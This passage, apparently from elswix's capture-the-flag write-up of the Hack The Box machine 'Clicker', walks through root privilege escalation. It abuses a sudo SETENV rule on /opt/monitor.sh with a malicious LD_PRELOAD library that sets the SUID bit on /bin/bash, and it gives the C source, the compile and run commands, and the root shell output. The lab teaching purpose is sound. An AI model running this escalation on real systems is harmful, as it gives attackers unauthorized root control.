+  <span class="n">IPv4</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="mf">10.10.11.232</span>
+  <span class="n">IPv6</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="n">dead</span><span class="p">:</span><span class="n">beef</span><span class="p">::</span><span class="mi">250</span><span class="p">:</span><span class="mi">56</span><span class="n">ff</span><span class="p">:</span><span class="n">feb9</span><span class="p">:</span><span class="mi">695</span><span class="n">a</span>
+
+
+<span class="n">Expanded</span> <span class="n">Security</span> <span class="n">Maintenance</span> <span class="k">for</span> <span class="n">Applications</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">enabled</span><span class="o">.</span>
+
+<span class="mi">0</span> <span class="n">updates</span> <span class="n">can</span> <span class="n">be</span> <span class="n">applied</span> <span class="n">immediately</span><span class="o">.</span>
+
+<span class="n">Enable</span> <span class="n">ESM</span> <span class="n">Apps</span> <span class="n">to</span> <span class="n">receive</span> <span class="n">additional</span> <span class="n">future</span> <span class="n">security</span> <span class="n">updates</span><span class="o">.</span>
+<span class="n">See</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">esm</span> <span class="ow">or</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">pro</span> <span class="n">status</span>
+
+
+<span class="n">The</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">available</span> <span class="n">updates</span> <span class="ow">is</span> <span class="n">more</span> <span class="n">than</span> <span class="n">a</span> <span class="n">week</span> <span class="n">old</span><span class="o">.</span>
+<span class="n">To</span> <span class="n">check</span> <span class="k">for</span> <span class="n">new</span> <span class="n">updates</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">apt</span> <span class="n">update</span>
+<span class="n">Failed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">changelogs</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">meta</span><span class="o">-</span><span class="n">release</span><span class="o">-</span><span class="n">lts</span><span class="o">.</span> <span class="n">Check</span> <span class="n">your</span> <span class="n">Internet</span> <span class="n">connection</span> <span class="ow">or</span> <span class="n">proxy</span> <span class="n">settings</span>
+
+
+<span class="n">Last</span> <span class="n">login</span><span class="p">:</span> <span class="n">Tue</span> <span class="n">Jan</span> <span class="mi">23</span> <span class="mi">13</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">27</span> <span class="mi">2024</span> <span class="kn">from</span> <span class="mf">10.10.16.5</span>
+<span class="n">To</span> <span class="n">run</span> <span class="n">a</span> <span class="n">command</span> <span class="k">as</span> <span class="n">administrator</span> <span class="p">(</span><span class="n">user</span> <span class="s2">"root"</span><span class="p">),</span> <span class="n">use</span> <span class="s2">"sudo &lt;command&gt;"</span><span class="o">.</span>
+<span class="n">See</span> <span class="s2">"man sudo_root"</span> <span class="k">for</span> <span class="n">details</span><span class="o">.</span>
+
+<span class="nd">jack@clicker</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+
+Finally, we have successfully gained access to the system as <code>Jack</code>.<br/><br/>
+We can read <code>user.txt</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">jack@clicker</span><span class="p">:</span><span class="o">~$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+<span class="mi">7903</span><span class="n">e</span><span class="o">**********************</span><span class="n">b60b0</span>
+<span class="nd">jack@clicker</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+
+As <code>Jack</code>, we belong to interesting groups:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">jack@clicker</span><span class="p">:</span><span class="o">~$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
+<span class="nd">jack@clicker</span><span class="p">:</span><span class="o">~$</span> <span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">jack</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">jack</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">jack</span><span class="p">),</span><span class="mi">4</span><span class="p">(</span><span class="n">adm</span><span class="p">),</span><span class="mi">24</span><span class="p">(</span><span class="n">cdrom</span><span class="p">),</span><span class="mi">27</span><span class="p">(</span><span class="n">sudo</span><span class="p">),</span><span class="mi">30</span><span class="p">(</span><span class="n">dip</span><span class="p">),</span><span class="mi">46</span><span class="p">(</span><span class="n">plugdev</span><span class="p">)</span>
+<span class="nd">jack@clicker</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+
+If we had Jack's password, we could run <code>sudo su</code> to gain access as root, leveraging membership in the <code>sudo</code> group.<br/><br/>
+As <code>Jack</code>, we have interesting sudo privileges:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">jack@clicker</span><span class="p">:</span><span class="o">~$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+<span class="n">Matching</span> <span class="n">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">jack</span> <span class="n">on</span> <span class="n">clicker</span><span class="p">:</span>
+    <span class="n">env_reset</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span> <span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="nb">bin</span><span class="p">,</span> <span class="n">use_pty</span>
+
+<span class="n">User</span> <span class="n">jack</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="n">clicker</span><span class="p">:</span>
+    <span class="p">(</span><span class="n">ALL</span> <span class="p">:</span> <span class="n">ALL</span><span class="p">)</span> <span class="n">ALL</span>
+    <span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">SETENV</span><span class="p">:</span> <span class="n">NOPASSWD</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">monitor</span><span class="o">.</span><span class="n">sh</span>
+<span class="nd">jack@clicker</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+
+We can execute the bash script <code>/opt/monitor.sh</code> as root. The interesting thing here is the SETENV privilege.<br/><br/>
+The SETENV privilege in the context of sudo allows a user to set or preserve environment variables when executing commands with elevated privileges. When a user has the SETENV privilege, they can control certain aspects of the command's execution environment, providing more flexibility and customization<br/><br/>
+Let's read the script:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">jack@clicker</span><span class="p">:</span><span class="o">~$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">monitor</span><span class="o">.</span><span class="n">sh</span> 
+<span class="c1">#!/bin/bash</span>
+<span class="k">if</span> <span class="p">[</span> <span class="s2">"$EUID"</span> <span class="o">-</span><span class="n">ne</span> <span class="mi">0</span> <span class="p">]</span>
+  <span class="n">then</span> <span class="n">echo</span> <span class="s2">"Error, please run as root"</span>
+  <span class="n">exit</span>
+<span class="n">fi</span>
+
+<span class="nb">set</span> <span class="n">PATH</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="nb">bin</span>
+<span class="n">unset</span> <span class="n">PERL5LIB</span><span class="p">;</span>
+<span class="n">unset</span> <span class="n">PERLLIB</span><span class="p">;</span>
+
+<span class="n">data</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">diagnostic</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">token</span><span class="o">=</span><span class="n">secret_diagnostic_token</span><span class="p">);</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">xml_pp</span> <span class="o">&lt;&lt;&lt;</span> <span class="err">$</span><span class="n">data</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">[[</span> <span class="err">$</span><span class="n">NOSAVE</span> <span class="o">==</span> <span class="s2">"true"</span> <span class="p">]];</span> <span class="n">then</span>
+    <span class="n">exit</span><span class="p">;</span>
+<span class="k">else</span>
+    <span class="n">timestamp</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">date</span> <span class="o">+%</span><span class="n">s</span><span class="p">)</span>
+    <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">echo</span> <span class="err">$</span><span class="n">data</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">diagnostic_files</span><span class="o">/</span><span class="n">diagnostic_</span><span class="err">$</span><span class="p">{</span><span class="n">timestamp</span><span class="p">}</span><span class="o">.</span><span class="n">xml</span>
+<span class="n">fi</span>
+<span class="nd">jack@clicker</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+
+As the PATH variable is being set during the execution, PATH hijacking won't be exploitable. Instead of modifying the PATH, since this script executes binaries with linked libraries, we could potentially set the <code>LD_PRELOAD</code> variable to a malicious shared library and escalate to root.<br/><br/>
+<code>LD_PRELOAD</code> is an environment variable in Unix-like operating systems that allows a user to specify a shared library to be loaded before other libraries when a program starts. So, in the event that we create a malicious library and set this variable, we could achieve execution as root, as the program will be executed with root privileges.<br/><br/>
+<a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path">Hacktricks</a> has an excellent example of how to exploit this.<br/><br/>
+This will be the library source code<br/><br/>
+<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">_init</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">unsetenv</span><span class="p">(</span><span class="s">"LD_PRELOAD"</span><span class="p">);</span>
+<span class="w">    </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/chmod 4755 /bin/bash"</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+This code will assign Set-UID privileges to the <code>/bin/bash</code> binary. Subsequently, we can execute with root privileges using <code>bash -p</code>.<br/><br/>
+Now, let's compile the code:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">gcc</span> <span class="n">malicious</span><span class="o">.</span><span class="n">c</span> <span class="o">-</span><span class="n">fPIC</span> <span class="o">-</span><span class="n">shared</span> <span class="o">-</span><span class="n">nostartfiles</span> <span class="o">-</span><span class="n">o</span> <span class="n">malicious</span><span class="o">.</span><span class="n">so</span>
+<span class="n">malicious</span><span class="o">.</span><span class="n">c</span><span class="p">:</span> <span class="n">In</span> <span class="n">function</span> <span class="err">‘</span><span class="n">_init</span><span class="err">’</span><span class="p">:</span>
+<span class="n">malicious</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span> <span class="n">warning</span><span class="p">:</span> <span class="n">implicit</span> <span class="n">declaration</span> <span class="n">of</span> <span class="n">function</span> <span class="err">‘</span><span class="n">setgid</span><span class="err">’</span> <span class="p">[</span><span class="o">-</span><span class="n">Wimplicit</span><span class="o">-</span><span class="n">function</span><span class="o">-</span><span class="n">declaration</span><span class="p">]</span>
+    <span class="mi">7</span> <span class="o">|</span>     <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+      <span class="o">|</span>     <span class="o">^~~~~~</span>
+<span class="n">malicious</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span> <span class="n">warning</span><span class="p">:</span> <span class="n">implicit</span> <span class="n">declaration</span> <span class="n">of</span> <span class="n">function</span> <span class="err">‘</span><span class="n">setuid</span><span class="err">’</span> <span class="p">[</span><span class="o">-</span><span class="n">Wimplicit</span><span class="o">-</span><span class="n">function</span><span class="o">-</span><span class="n">declaration</span><span class="p">]</span>
+    <span class="mi">8</span> <span class="o">|</span>     <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+      <span class="o">|</span>     <span class="o">^~~~~~</span>
+</pre></div>
+
+After uploading the malicious library to the victim machine, we will execute the script with sudo:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">jack@clicker</span><span class="p">:</span><span class="o">~$</span> <span class="n">sudo</span> <span class="n">LD_PRELOAD</span><span class="o">=./</span><span class="n">malicious</span><span class="o">.</span><span class="n">so</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">monitor</span><span class="o">.</span><span class="n">sh</span> 
+<span class="o">&lt;</span><span class="err">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s2">"1.0"</span><span class="err">?</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">data</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="n">timestamp</span><span class="o">&gt;</span><span class="mi">1706021915</span><span class="o">&lt;/</span><span class="n">timestamp</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="n">date</span><span class="o">&gt;</span><span class="mi">2024</span><span class="o">/</span><span class="mi">01</span><span class="o">/</span><span class="mi">23</span> <span class="mi">02</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">35</span><span class="n">pm</span><span class="o">&lt;/</span><span class="n">date</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="n">php</span><span class="o">-</span><span class="n">version</span><span class="o">&gt;</span><span class="mf">8.1.2</span><span class="o">-</span><span class="mi">1</span><span class="n">ubuntu2</span><span class="mf">.14</span><span class="o">&lt;/</span><span class="n">php</span><span class="o">-</span><span class="n">version</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="n">test</span><span class="o">-</span><span class="n">connection</span><span class="o">-</span><span class="n">db</span><span class="o">&gt;</span><span class="n">OK</span><span class="o">&lt;/</span><span class="n">test</span><span class="o">-</span><span class="n">connection</span><span class="o">-</span><span class="n">db</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="n">memory</span><span class="o">-</span><span class="n">usage</span><span class="o">&gt;</span><span class="mi">392704</span><span class="o">&lt;/</span><span class="n">memory</span><span class="o">-</span><span class="n">usage</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="n">environment</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">APACHE_RUN_DIR</span><span class="o">&gt;/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">apache2</span><span class="o">&lt;/</span><span class="n">APACHE_RUN_DIR</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">SYSTEMD_EXEC_PID</span><span class="o">&gt;</span><span class="mi">1174</span><span class="o">&lt;/</span><span class="n">SYSTEMD_EXEC_PID</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">APACHE_PID_FILE</span><span class="o">&gt;/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">apache2</span><span class="o">.</span><span class="n">pid</span><span class="o">&lt;/</span><span class="n">APACHE_PID_FILE</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">JOURNAL_STREAM</span><span class="o">&gt;</span><span class="mi">8</span><span class="p">:</span><span class="mi">26751</span><span class="o">&lt;/</span><span class="n">JOURNAL_STREAM</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">PATH</span><span class="o">&gt;/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">&lt;/</span><span class="n">PATH</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">INVOCATION_ID</span><span class="o">&gt;</span><span class="mi">863</span><span class="n">bf7bd6c5e4002bcbad4f8a136e170</span><span class="o">&lt;/</span><span class="n">INVOCATION_ID</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">APACHE_LOCK_DIR</span><span class="o">&gt;/</span><span class="n">var</span><span class="o">/</span><span class="n">lock</span><span class="o">/</span><span class="n">apache2</span><span class="o">&lt;/</span><span class="n">APACHE_LOCK_DIR</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">LANG</span><span class="o">&gt;</span><span class="n">C</span><span class="o">&lt;/</span><span class="n">LANG</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">APACHE_RUN_USER</span><span class="o">&gt;</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">&lt;/</span><span class="n">APACHE_RUN_USER</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">APACHE_RUN_GROUP</span><span class="o">&gt;</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">&lt;/</span><span class="n">APACHE_RUN_GROUP</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">APACHE_LOG_DIR</span><span class="o">&gt;/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">apache2</span><span class="o">&lt;/</span><span class="n">APACHE_LOG_DIR</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">PWD</span><span class="o">&gt;/&lt;/</span><span class="n">PWD</span><span class="o">&gt;</span>
+  <span class="o">&lt;/</span><span class="n">environment</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">data</span><span class="o">&gt;</span>
+</pre></div>
+
+Now, if we list the privileges of <code>/bin/bash</code>, it will show that it has Set-UID privileges:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">jack@clicker</span><span class="p">:</span><span class="o">~$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">1396520</span> <span class="n">Jan</span>  <span class="mi">6</span>  <span class="mi">2022</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="nd">jack@clicker</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+
+So now, by running <code>bash -p</code>, we can achieve execution as root:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">jack@clicker</span><span class="p">:</span><span class="o">~$</span> <span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="root1">#<span class="n"> whoami</span>
+<span class="n">root</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="root1">#</span>
+</pre></div>
+
+Finally, we can read <code>root.txt</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="root1">#<span class="n"> cd /root</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="root1">#<span class="n"> cat root.txt</span>
+<span class="mf">5e6</span><span class="n">e3</span><span class="o">**********************</span><span class="mi">9</span><span class="n">c668</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="root1">#</span>
+</pre></div></br></br></br></br></br></br></br></br></br>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2024 elswix.github.io</p>
+    </footer>
+</body>
+</html>
